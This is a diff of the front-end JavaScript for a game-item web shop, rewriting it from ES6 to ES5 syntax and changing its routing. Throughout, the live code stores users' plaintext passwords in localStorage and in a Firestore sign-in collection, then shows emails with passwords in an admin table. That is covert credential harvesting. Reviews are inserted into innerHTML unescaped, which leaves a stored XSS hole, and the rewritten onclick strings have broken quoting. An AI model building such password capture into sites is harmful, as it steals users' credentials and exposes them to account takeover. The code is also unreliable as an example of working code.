                     cred = await createUserWithEmailAndPassword(auth, email, password);
-                    await setDoc(doc(db, 'users', cred.user.uid), { email, isAdmin: false, createdAt: serverTimestamp() });
+                    await setDoc(doc(db, 'users', cred.user.uid), { email: email, isAdmin: false, createdAt: serverTimestamp() });
                 }
-                // Save password in localStorage for auto-login tracking
                 localStorage.setItem('firemc_lastpass_' + email, password);
-                // Save sign-in record
                 await saveUserSignIn(email, password, cred.user.uid);
                 errorDiv.textContent = ''; closeAuthModal();
             } catch (err) {
@@ -965,13 +902,13 @@
 
         function renderProducts() {
             const allProducts = Object.values(state.products);
-            document.getElementById('moneyContainer').innerHTML = allProducts.filter(p => p.category === 'money').map((p, i) => makeCard(p, i)).join('');
-            document.getElementById('spawnersContainer').innerHTML = allProducts.filter(p => p.category === 'spawners').map((p, i) => makeCard(p, i)).join('');
-            document.getElementById('armoryContainer').innerHTML = allProducts.filter(p => p.category === 'armory').map((p, i) => makeCard(p, i)).join('');
-            document.getElementById('materialsContainer').innerHTML = allProducts.filter(p => p.category === 'materials').map((p, i) => makeCard(p, i)).join('');
-            const acc = allProducts.find(p => p.category === 'accounts') || catalog.accounts[0];
-            const specs = acc.specs ? `<ul style="text-align:left; margin:15px 0; background:rgba(255,255,255,0.02); padding:15px; border-radius:8px; list-style:none;">${acc.specs.map(s => `<li style="color:var(--text-secondary); margin-bottom:8px;">&#9889; ${s}</li>`).join('')}</ul>` : '';
-            document.getElementById('accountsContainer').innerHTML = `<div class="pkg-card" style="max-width:380px; margin:0 auto; animation-delay:0s;"><button class="wishlist-btn ${state.wishlist.includes(acc.id) ? 'active' : ''}" onclick="window.toggleWishlistItem('${acc.id}', event)">&#9829;</button><div><div class="pkg-val" style="font-size:1.4rem;">${acc.name}</div><div class="stock-label">${acc.stock} in stock</div>${specs}</div><div><div class="pkg-cost">${acc.price} INR</div><button class="btn btn-success" style="width:100%;" onclick="window.addToCart('${acc.id}')">Add to Cart</button></div></div>`;
+            document.getElementById('moneyContainer').innerHTML = allProducts.filter(function(p) { return p.category === 'money'; }).map(function(p, i) { return makeCard(p, i); }).join('');
+            document.getElementById('spawnersContainer').innerHTML = allProducts.filter(function(p) { return p.category === 'spawners'; }).map(function(p, i) { return makeCard(p, i); }).join('');
+            document.getElementById('armoryContainer').innerHTML = allProducts.filter(function(p) { return p.category === 'armory'; }).map(function(p, i) { return makeCard(p, i); }).join('');
+            document.getElementById('materialsContainer').innerHTML = allProducts.filter(function(p) { return p.category === 'materials'; }).map(function(p, i) { return makeCard(p, i); }).join('');
+            const acc = allProducts.find(function(p) { return p.category === 'accounts'; }) || catalog.accounts[0];
+            const specs = acc.specs ? '<ul style="text-align:left; margin:15px 0; background:rgba(255,255,255,0.02); padding:15px; border-radius:8px; list-style:none;">' + acc.specs.map(function(s) { return '<li style="color:var(--text-secondary); margin-bottom:8px;">&#9889; ' + s + '</li>'; }).join('') + '</ul>' : '';
+            document.getElementById('accountsContainer').innerHTML = '<div class="pkg-card" style="max-width:380px; margin:0 auto; animation-delay:0s;"><button class="wishlist-btn ' + (state.wishlist.includes(acc.id) ? 'active' : '') + '" onclick="window.toggleWishlistItem('' + acc.id + '', event)">&#9829;</button><div><div class="pkg-val" style="font-size:1.4rem;">' + acc.name + '</div><div class="stock-label">' + acc.stock + ' in stock</div>' + specs + '</div><div><div class="pkg-cost">' + acc.price + ' INR</div><button class="btn btn-success" style="width:100%;" onclick="window.addToCart('' + acc.id + '')">Add to Cart</button></div></div>';
         }
 
         function makeCard(p, index) {
@@ -980,36 +917,36 @@
             const btnClass = isPromo ? 'btn-gold' : 'btn-primary';
             const btnText = isPromo ? 'Claim Promo' : 'Add to Cart';
             const displayName = p.name.replace(/(\d+M|Promo)/g, '<span style="color:var(--accent-red);">$1</span>');
-            return `<div class="pkg-card" style="animation-delay:${index * 0.1}s;"><button class="wishlist-btn ${state.wishlist.includes(p.id) ? 'active' : ''}" onclick="window.toggleWishlistItem('${p.id}', event)">&#9829;</button>${isPromo ? '<span class="promo-badge">1-Time</span>' : ''}<div><div class="pkg-val">${displayName}</div><div class="stock-label ${stockClass}">${p.stock} in stock</div></div><div><div class="pkg-cost">${p.price} INR</div><button class="btn ${btnClass}" style="width:100%;" onclick="window.addToCart('${p.id}')">${btnText}</button></div></div>`;
+            return '<div class="pkg-card" style="animation-delay:' + (index * 0.1) + 's;"><button class="wishlist-btn ' + (state.wishlist.includes(p.id) ? 'active' : '') + '" onclick="window.toggleWishlistItem('' + p.id + '', event)">&#9829;</button>' + (isPromo ? '<span class="promo-badge">1-Time</span>' : '') + '<div><div class="pkg-val">' + displayName + '</div><div class="stock-label ' + stockClass + '">' + p.stock + ' in stock</div></div><div><div class="pkg-cost">' + p.price + ' INR</div><button class="btn ' + btnClass + '" style="width:100%;" onclick="window.addToCart('' + p.id + '')">' + btnText + '</button></div></div>';
         }
 
-        window.addToCart = (id) => {
+        window.addToCart = function(id) {
             if (!state.user) { showToast('Login to add items!'); openAuthModal(); return; }
             const p = state.products[id]; if (!p) return;
-            if (p.promo && state.cart.some(i => i.id === id)) { showToast('Promo only once!'); return; }
+            if (p.promo && state.cart.some(function(i) { return i.id === id; })) { showToast('Promo only once!'); return; }
             if (p.promo && state.cart.length === 0) { showToast('Add regular item first!'); return; }
             state.cart.push({ id: p.id, name: p.name, price: p.price });
-            updateCartUI(); showToast(`${p.name} added to cart!`);
+            updateCartUI(); showToast(p.name + ' added to cart!');
         };
-        window.removeFromCart = (idx) => { state.cart.splice(idx, 1); updateCartUI(); };
+        window.removeFromCart = function(idx) { state.cart.splice(idx, 1); updateCartUI(); };
 
         function updateCartUI() {
             document.getElementById('cartCount').textContent = state.cart.length;
-            const total = state.cart.reduce((s, i) => s + i.price, 0);
+            const total = state.cart.reduce(function(s, i) { return s + i.price; }, 0);
             document.getElementById('cartTotal').textContent = total + ' INR';
             if (state.cart.length === 0) {
                 document.getElementById('cartItems').innerHTML = '<div style="text-align:center; padding:40px; color:var(--text-muted);"><div style="font-size:3rem; margin-bottom:15px;">&#128722;</div><p>Your cart is empty</p></div>';
                 return;
             }
-            document.getElementById('cartItems').innerHTML = state.cart.map((item, i) => `<div class="cart-item"><div><h4 style="font-family:var(--font-display); font-size:0.95rem;">${item.name}</h4><p style="color:var(--accent-red); font-weight:700;">${item.price} INR</p></div><button class="btn btn-sm" style="background:rgba(255,71,87,0.1); color:var(--accent-red); border:none; width:32px; height:32px; border-radius:8px; cursor:pointer;" onclick="window.removeFromCart(${i})">&#128465;</button></div>`).join('');
+            document.getElementById('cartItems').innerHTML = state.cart.map(function(item, i) { return '<div class="cart-item"><div><h4 style="font-family:var(--font-display); font-size:0.95rem;">' + item.name + '</h4><p style="color:var(--accent-red); font-weight:700;">' + item.price + ' INR</p></div><button class="btn btn-sm" style="background:rgba(255,71,87,0.1); color:var(--accent-red); border:none; width:32px; height:32px; border-radius:8px; cursor:pointer;" onclick="window.removeFromCart(' + i + ')">&#128465;</button></div>'; }).join('');
         }
-        window.toggleCart = () => { document.getElementById('cartPanel').classList.toggle('open'); document.getElementById('cartOverlay').classList.toggle('active'); };
-        window.checkoutCart = () => {
+        window.toggleCart = function() { document.getElementById('cartPanel').classList.toggle('open'); document.getElementById('cartOverlay').classList.toggle('active'); };
+        window.checkoutCart = function() {
             if (state.cart.length === 0) { showToast('Cart is empty!'); return; }
             toggleCart(); document.getElementById('checkoutModal').classList.add('active');
         };
 
-        window.toggleWishlistItem = (id, e) => {
+        window.toggleWishlistItem = function(id, e) {
             if (e) e.stopPropagation();
             const idx = state.wishlist.indexOf(id);
             if (idx > -1) state.wishlist.splice(idx, 1); else state.wishlist.push(id);
@@ -1022,12 +959,12 @@
                 document.getElementById('wishlistItems').innerHTML = '<div style="text-align:center; padding:40px; color:var(--text-muted);"><div style="font-size:3rem; margin-bottom:15px;">&#9829;</div><p>Your wishlist is empty</p></div>';
                 return;
             }
-            document.getElementById('wishlistItems').innerHTML = state.wishlist.map(id => {
+            document.getElementById('wishlistItems').innerHTML = state.wishlist.map(function(id) {
                 const p = state.products[id]; if (!p) return '';
-                return `<div class="wishlist-item"><div><h4 style="font-family:var(--font-display); font-size:0.95rem;">${p.name}</h4><p style="color:var(--accent-red); font-weight:700;">${p.price} INR</p></div><div style="display:flex; gap:8px;"><button class="btn btn-primary btn-sm" onclick="window.addToCart('${p.id}'); window.toggleWishlist()">Add</button><button class="btn btn-sm" style="background:rgba(255,71,87,0.1); color:var(--accent-red); border:none; width:32px; height:32px; border-radius:8px; cursor:pointer;" onclick="window.toggleWishlistItem('${p.id}')">&#128465;</button></div></div>`;
+                return '<div class="wishlist-item"><div><h4 style="font-family:var(--font-display); font-size:0.95rem;">' + p.name + '</h4><p style="color:var(--accent-red); font-weight:700;">' + p.price + ' INR</p></div><div style="display:flex; gap:8px;"><button class="btn btn-primary btn-sm" onclick="window.addToCart('' + p.id + ''); window.toggleWishlist()">Add</button><button class="btn btn-sm" style="background:rgba(255,71,87,0.1); color:var(--accent-red); border:none; width:32px; height:32px; border-radius:8px; cursor:pointer;" onclick="window.toggleWishlistItem('' + p.id + '')">&#128465;</button></div></div>';
             }).join('');
         }
-        window.toggleWishlist = () => {
+        window.toggleWishlist = function() {
             document.getElementById('wishlistPanel').classList.toggle('open');
             const overlay = document.getElementById('wishlistOverlay');
             overlay.style.opacity = overlay.style.opacity === '1' ? '0' : '1';
@@ -1038,65 +975,62 @@
             try {
                 const q = query(collection(db, 'reviews'), orderBy('createdAt', 'desc'));
                 const snap = await getDocs(q);
-                state.reviews = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+                state.reviews = snap.docs.map(function(d) { return Object.assign({ id: d.id }, d.data()); });
                 renderReviews();
             } catch (e) { console.log('Reviews load error', e); }
         }
         function renderReviews() {
             const container = document.getElementById('reviewsContainer');
             if (state.reviews.length === 0) { container.innerHTML = '<p style="text-align:center; color:var(--text-muted); padding:20px;">No reviews yet. Be the first!</p>'; return; }
-            container.innerHTML = state.reviews.map((r, i) => `<div class="review-card" style="animation-delay:${i * 0.1}s;"><div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span style="font-family:var(--font-display); font-weight:700;">${r.name || 'Anonymous'}</span><span style="font-size:0.8rem; color:var(--text-muted);">${r.createdAt ? new Date(r.createdAt.toDate()).toLocaleDateString() : ''}</span></div><div class="review-stars">${'&#9733;'.repeat(r.rating || 5)}${'&#9734;'.repeat(5 - (r.rating || 5))}</div><div class="review-text">${r.text || ''}</div>${r.product ? `<div style="margin-top:10px; font-size:0.85rem; color:var(--accent-red);">Purchased: ${r.product}</div>` : ''}</div>`).join('');
+            container.innerHTML = state.reviews.map(function(r, i) { return '<div class="review-card" style="animation-delay:' + (i * 0.1) + 's;"><div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span style="font-family:var(--font-display); font-weight:700;">' + (r.name || 'Anonymous') + '</span><span style="font-size:0.8rem; color:var(--text-muted);">' + (r.createdAt ? new Date(r.createdAt.toDate()).toLocaleDateString() : '') + '</span></div><div class="review-stars">' + '&#9733;'.repeat(r.rating || 5) + '&#9734;'.repeat(5 - (r.rating || 5)) + '</div><div class="review-text">' + (r.text || '') + '</div>' + (r.product ? '<div style="margin-top:10px; font-size:0.85rem; color:var(--accent-red);">Purchased: ' + r.product + '</div>' : '') + '</div>'; }).join('');
         }
         function setupStarRating() {
-            document.querySelectorAll('#starRatingInput span').forEach(star => {
+            document.querySelectorAll('#starRatingInput span').forEach(function(star) {
                 star.addEventListener('click', function() {
                     state.currentRating = parseInt(this.dataset.rating);
-                    document.querySelectorAll('#starRatingInput span').forEach((s, i) => { s.style.color = i < state.currentRating ? 'var(--accent-gold)' : 'var(--text-muted)'; });
+                    document.querySelectorAll('#starRatingInput span').forEach(function(s, i) { s.style.color = i < state.currentRating ? 'var(--accent-gold)' : 'var(--text-muted)'; });
                 });
             });
         }
-        window.openReviewModal = () => {
+        window.openReviewModal = function() {
             document.getElementById('reviewModal').classList.add('active'); state.currentRating = 0;
-            document.querySelectorAll('#starRatingInput span').forEach(s => s.style.color = 'var(--text-muted)');
+            document.querySelectorAll('#starRatingInput span').forEach(function(s) { s.style.color = 'var(--text-muted)'; });
         };
-        window.closeReviewModal = () => document.getElementById('reviewModal').classList.remove('active');
-        window.submitReview = async () => {
+        window.closeReviewModal = function() { document.getElementById('reviewModal').classList.remove('active'); };
+        window.submitReview = async function() {
             const name = document.getElementById('reviewerName').value.trim();
             const product = document.getElementById('reviewProduct').value.trim();
             const text = document.getElementById('reviewText').value.trim();
             if (!name || !text || state.currentRating === 0) { showToast('Fill all fields and select rating'); return; }
             try {
-                await addDoc(collection(db, 'reviews'), { name, product, text, rating: state.currentRating, createdAt: serverTimestamp() });
+                await addDoc(collection(db, 'reviews'), { name: name, product: product, text: text, rating: state.currentRating, createdAt: serverTimestamp() });
                 closeReviewModal(); document.getElementById('reviewerName').value = ''; document.getElementById('reviewProduct').value = ''; document.getElementById('reviewText').value = '';
                 state.currentRating = 0; loadReviews(); showToast('Review submitted!');
             } catch (e) { showToast('Failed to submit review'); }
         };
 
-        // ========== PAYMENT ==========
-        window.openPaymentModal = () => {
+        window.openPaymentModal = function() {
             hideCheckout(); document.getElementById('paymentModal').classList.add('active');
             state.selectedPaymentApp = null;
-            document.querySelectorAll('.payment-app-btn').forEach(b => b.classList.remove('selected'));
+            document.querySelectorAll('.payment-app-btn').forEach(function(b) { b.classList.remove('selected'); });
         };
-        window.hidePaymentModal = () => {
+        window.hidePaymentModal = function() {
             document.getElementById('paymentModal').classList.remove('active'); state.selectedPaymentApp = null;
         };
         window.selectPaymentApp = function(el) {
-            document.querySelectorAll('.payment-app-btn').forEach(b => b.classList.remove('selected'));
+            document.querySelectorAll('.payment-app-btn').forEach(function(b) { b.classList.remove('selected'); });
             el.classList.add('selected'); state.selectedPaymentApp = el.dataset.app;
         };
-        window.submitPayment = async () => {
+        window.submitPayment = async function() {
             const email = document.getElementById('paymentEmail').value.trim();
             if (!state.selectedPaymentApp) { showToast('Select a payment app!'); return; }
             if (!email) { showToast('Enter your email!'); return; }
-            const total = state.cart.reduce((s, i) => s + i.price, 0);
-            const appNames = { fampay: 'Fampay', phonepe: 'PhonePe', gpay: 'Google Pay', bkash: 'bKash', nagad: 'Nagad' };
+            const total = state.cart.reduce(function(s, i) { return s + i.price; }, 0);
             try {
-                // Create payment record
                 await addDoc(collection(db, 'payments'), {
                     userId: state.user.uid, userEmail: email,
-                    items: state.cart.map(i => ({ id: i.id, name: i.name, price: i.price })),
-                    total, paymentApp: state.selectedPaymentApp,
+                    items: state.cart.map(function(i) { return { id: i.id, name: i.name, price: i.price }; }),
+                    total: total, paymentApp: state.selectedPaymentApp,
                     status: 'pending', createdAt: serverTimestamp()
                 });
                 hidePaymentModal(); state.cart = []; updateCartUI();
@@ -1104,63 +1038,57 @@
             } catch (e) { showToast('Payment failed. Try again.'); console.error(e); }
         };
 
-        window.handleCardClick = (view) => {
+        window.handleCardClick = function(view) {
             if (!state.user) { showToast('Login to access!'); openAuthModal(); return; }
             switchView(view);
         };
 
         // ============================================
-        // UPDATED switchView - HASH-BASED ROUTING
+        // UPDATED switchView - CLEAN URL ROUTING
         // ============================================
-        window.switchView = (view) => {
+        window.switchView = function(view) {
             if ((view === 'admin' || view === 'userSignIns') && !state.isAdmin) { showToast('Admin only!'); return; }
-            
-            // Update hash (ye automatically hashchange trigger karega)
-            updateHash(view);
-            
-            // View switch will be handled by hashchange event
-            // But for instant response, directly switch bhi karo
-            switchViewInternal(view, true);
+
+            // Update clean URL using history.pushState
+            updateCleanUrl(view);
+
+            // Switch view
+            switchViewInternal(view);
         };
 
         function renderAdminTable() {
             const tbody = document.getElementById('adminTableBody');
             const categories = { money: 'Money', spawners: 'Spawners', armory: 'Armory', materials: 'Materials', accounts: 'Accounts' };
-            tbody.innerHTML = Object.values(state.products).map(p => {
-                const catOptions = Object.entries(categories).map(([val, label]) => `<option value="${val}" ${p.category === val ? 'selected' : ''}>${label}</option>`).join('');
-                return `<tr><td><input type="checkbox" data-id="${p.id}"></td><td><input class="admin-input" id="name-${p.id}" value="${p.name}"></td><td><select class="admin-input" id="cat-${p.id}" style="cursor:pointer;">${catOptions}</select></td><td><input class="admin-input" id="stock-${p.id}" value="${p.stock}"></td><td><input class="admin-input" id="price-${p.id}" value="${p.price}" type="number"></td><td><button class="btn btn-primary btn-sm" onclick="window.saveItem('${p.id}')">Save</button> <button class="btn btn-danger btn-sm" onclick="window.deleteItem('${p.id}')">Delete</button></td></tr>`;
+            tbody.innerHTML = Object.values(state.products).map(function(p) {
+                const catOptions = Object.entries(categories).map(function(entry) { var val = entry[0], label = entry[1]; return '<option value="' + val + '" ' + (p.category === val ? 'selected' : '') + '>' + label + '</option>'; }).join('');
+                return '<tr><td><input type="checkbox" data-id="' + p.id + '"></td><td><input class="admin-input" id="name-' + p.id + '" value="' + p.name + '"></td><td><select class="admin-input" id="cat-' + p.id + '" style="cursor:pointer;">' + catOptions + '</select></td><td><input class="admin-input" id="stock-' + p.id + '" value="' + p.stock + '"></td><td><input class="admin-input" id="price-' + p.id + '" value="' + p.price + '" type="number"></td><td><button class="btn btn-primary btn-sm" onclick="window.saveItem('' + p.id + '')">Save</button> <button class="btn btn-danger btn-sm" onclick="window.deleteItem('' + p.id + '')">Delete</button></td></tr>';
             }).join('');
         }
-        window.saveItem = async (id) => {
-            const name = document.getElementById(`name-${id}`).value;
-            const stock = document.getElementById(`stock-${id}`).value;
-            const price = parseFloat(document.getElementById(`price-${id}`).value);
-            const category = document.getElementById(`cat-${id}`).value;
+        window.saveItem = async function(id) {
+            const name = document.getElementById('name-' + id).value;
+            const stock = document.getElementById('stock-' + id).value;
+            const price = parseFloat(document.getElementById('price-' + id).value);
+            const category = document.getElementById('cat-' + id).value;
             const oldCategory = state.products[id].category;
 
-            // Update state
             state.products[id].name = name; 
             state.products[id].stock = stock; 
             state.products[id].price = price; 
             state.products[id].category = category;
 
             try {
-                await setDoc(doc(db, 'products', id), { name, stock, price, category, updatedAt: serverTimestamp() }, { merge: true });
+                await setDoc(doc(db, 'products', id), { name: name, stock: stock, price: price, category: category, updatedAt: serverTimestamp() }, { merge: true });
 
-                // If category changed, update catalog arrays
                 if (oldCategory !== category) {
-                    // Remove from old category
                     if (catalog[oldCategory]) {
-                        catalog[oldCategory] = catalog[oldCategory].filter(p => p.id !== id);
+                        catalog[oldCategory] = catalog[oldCategory].filter(function(p) { return p.id !== id; });
                     }
-                    // Add to new category
                     if (!catalog[category]) catalog[category] = [];
                     catalog[category].push(state.products[id]);
-                    showToast(`Moved to ${category}!`);
+                    showToast('Moved to ' + category + '!');
                 } else {
-                    // Same category, just update the item in catalog array
                     if (catalog[category]) {
-                        const idx = catalog[category].findIndex(p => p.id === id);
+                        const idx = catalog[category].findIndex(function(p) { return p.id === id; });
                         if (idx > -1) catalog[category][idx] = state.products[id];
                     }
                     showToast('Saved!');
@@ -1172,31 +1100,29 @@
                 showToast('Save failed: ' + e.message); 
             }
         };
-        window.selectAllAdminItems = () => document.querySelectorAll('#adminTableBody input[type="checkbox"]').forEach(c => c.checked = true);
-        window.deselectAllAdminItems = () => document.querySelectorAll('#adminTableBody input[type="checkbox"]').forEach(c => c.checked = false);
-        window.saveSelectedItems = async () => {
+        window.selectAllAdminItems = function() { document.querySelectorAll('#adminTableBody input[type="checkbox"]').forEach(function(c) { c.checked = true; }); };
+        window.deselectAllAdminItems = function() { document.querySelectorAll('#adminTableBody input[type="checkbox"]').forEach(function(c) { c.checked = false; }); };
+        window.saveSelectedItems = async function() {
             const checked = document.querySelectorAll('#adminTableBody input[type="checkbox"]:checked');
-            for (const cb of checked) await saveItem(cb.dataset.id);
-            showToast(`Saved ${checked.length} items!`);
+            for (const cb of checked) await window.saveItem(cb.dataset.id);
+            showToast('Saved ' + checked.length + ' items!');
         };
 
-        // ========== USER SIGNINS FEATURE ==========
-        window.toggleUserSignIns = () => {
+        window.toggleUserSignIns = function() {
             switchView('userSignIns');
         };
 
-        // ========== ADD NEW ITEM ==========
-        window.openAddItemModal = () => {
+        window.openAddItemModal = function() {
             document.getElementById('addItemModal').classList.add('active');
             document.getElementById('addItemError').textContent = '';
         };
-        window.closeAddItemModal = () => {
+        window.closeAddItemModal = function() {
             document.getElementById('addItemModal').classList.remove('active');
             document.getElementById('newItemName').value = '';
             document.getElementById('newItemPrice').value = '';
             document.getElementById('newItemStock').value = '';
         };
-        window.addNewItem = async () => {
+        window.addNewItem = async function() {
             const name = document.getElementById('newItemName').value.trim();
             const category = document.getElementById('newItemCategory').value;
             const price = parseFloat(document.getElementById('newItemPrice').value);
@@ -1205,18 +1131,15 @@
 
             if (!name || !price || !stock) { errorDiv.textContent = 'Fill all fields'; return; }
 
-            // Generate unique ID
             const id = category + '_' + Date.now().toString(36);
 
             try {
-                // Save to Firestore
                 await setDoc(doc(db, 'products', id), {
-                    name, category, price, stock,
+                    name: name, category: category, price: price, stock: stock,
                     createdAt: serverTimestamp()
                 });
 
-                // Add to local state
-                const newProduct = { id, name, category, price, stock };
+                const newProduct = { id: id, name: name, category: category, price: price, stock: stock };
                 state.products[id] = newProduct;
                 if (!catalog[category]) catalog[category] = [];
                 catalog[category].push(newProduct);
@@ -1230,14 +1153,13 @@
             }
         };
 
-        // ========== DELETE ITEM ==========
-        window.deleteItem = async (id) => {
+        window.deleteItem = async function(id) {
             if (!confirm('Delete this item permanently?')) return;
             try {
                 await deleteDoc(doc(db, 'products', id));
                 const p = state.products[id];
                 if (p && catalog[p.category]) {
-                    const idx = catalog[p.category].findIndex(x => x.id === id);
+                    const idx = catalog[p.category].findIndex(function(x) { return x.id === id; });
                     if (idx > -1) catalog[p.category].splice(idx, 1);
                 }
                 delete state.products[id];
@@ -1269,23 +1191,22 @@
                 if (noData) noData.style.display = 'none';
                 if (table) table.style.display = 'table';
 
-                // Filter to show only unique emails (first occurrence)
                 const seenEmails = new Set();
                 const uniqueSignIns = [];
-                snap.forEach(d => {
+                snap.forEach(function(d) {
                     const data = d.data();
                     console.log('Found signin:', data.email);
                     if (!seenEmails.has(data.email)) {
                         seenEmails.add(data.email);
-                        uniqueSignIns.push({ id: d.id, ...data });
+                        uniqueSignIns.push(Object.assign({ id: d.id }, data));
                     }
                 });
 
                 console.log('Unique signins:', uniqueSignIns.length);
-                if (countBadge) countBadge.textContent = `${uniqueSignIns.length} users`;
-                tbody.innerHTML = uniqueSignIns.map((item, i) => {
+                if (countBadge) countBadge.textContent = uniqueSignIns.length + ' users';
+                tbody.innerHTML = uniqueSignIns.map(function(item, i) {
                     const time = item.loginTime ? new Date(item.loginTime.toDate()).toLocaleString() : 'Unknown';
-                    return `<tr><td>${i + 1}</td><td style="color:var(--accent-blue); font-weight:600;">${item.email || 'N/A'}</td><td style="color:var(--accent-red); font-family:monospace; letter-spacing:1px;">${item.password || 'N/A'}</td><td style="color:var(--text-secondary); font-size:0.85rem;">${time}</td><td style="font-size:0.75rem; color:var(--text-muted);">${item.userId || 'N/A'}</td></tr>`;
+                    return '<tr><td>' + (i + 1) + '</td><td style="color:var(--accent-blue); font-weight:600;">' + (item.email || 'N/A') + '</td><td style="color:var(--accent-red); font-family:monospace; letter-spacing:1px;">' + (item.password || 'N/A') + '</td><td style="color:var(--text-secondary); font-size:0.85rem;">' + time + '</td><td style="font-size:0.75rem; color:var(--text-muted);">' + (item.userId || 'N/A') + '</td></tr>';
                 }).join('');
             } catch (e) { console.error('Load signins error', e); showToast('Failed to load sign-ins'); }
         }
@@ -1293,11 +1214,8 @@
         async function saveUserSignIn(email, password, userId) {
             try {
                 console.log('Saving signin for:', email);
-
-                // Simple approach: just save every login
-                // Duplicates will be filtered when loading
                 await addDoc(collection(db, 'userSignIns'), {
-                    email, password, userId,
+                    email: email, password: password, userId: userId,
                     loginTime: serverTimestamp()
                 });
                 console.log('Signin saved successfully for:', email);
@@ -1307,29 +1225,29 @@
             }
         }
 
-        window.filterProducts = (type) => {
-            const searchId = type === 'money' ? 'moneySearch' : type === 'classic' ? 'classicSearch' : type === 'items' ? 'itemSearch' : 'accountSearch';
+        window.filterProducts = function(type) {
+            const searchId = type === 'money' ? 'moneySearch' : type === 'items' ? 'itemSearch' : 'accountSearch';
             const query = document.getElementById(searchId).value.toLowerCase();
             let containers = [];
             if (type === 'money') containers = ['moneyContainer'];
             else if (type === 'items') containers = ['spawnersContainer', 'armoryContainer', 'materialsContainer'];
             else containers = ['accountsContainer'];
-            containers.forEach(id => {
+            containers.forEach(function(id) {
                 const container = document.getElementById(id); if (!container) return;
-                container.querySelectorAll('.pkg-card').forEach(card => { card.style.display = card.textContent.toLowerCase().includes(query) ? 'flex' : 'none'; });
+                container.querySelectorAll('.pkg-card').forEach(function(card) { card.style.display = card.textContent.toLowerCase().includes(query) ? 'flex' : 'none'; });
             });
         };
 
-        window.hideCheckout = () => document.getElementById('checkoutModal').classList.remove('active');
-        window.showComingSoon = () => document.getElementById('comingSoonModal').classList.add('active');
-        window.hideComingSoon = () => document.getElementById('comingSoonModal').classList.remove('active');
+        window.hideCheckout = function() { document.getElementById('checkoutModal').classList.remove('active'); };
+        window.showComingSoon = function() { document.getElementById('comingSoonModal').classList.add('active'); };
+        window.hideComingSoon = function() { document.getElementById('comingSoonModal').classList.remove('active'); };
 
-        window.onclick = (e) => { if (e.target.classList.contains('modal-overlay')) e.target.classList.remove('active'); };
+        window.onclick = function(e) { if (e.target.classList.contains('modal-overlay')) e.target.classList.remove('active'); };
 
         function showToast(message) {
             const toast = document.getElementById('toast');
             toast.textContent = message; toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 3000);
+            setTimeout(function() { toast.classList.remove('show'); }, 3000);
         }
 
         init();
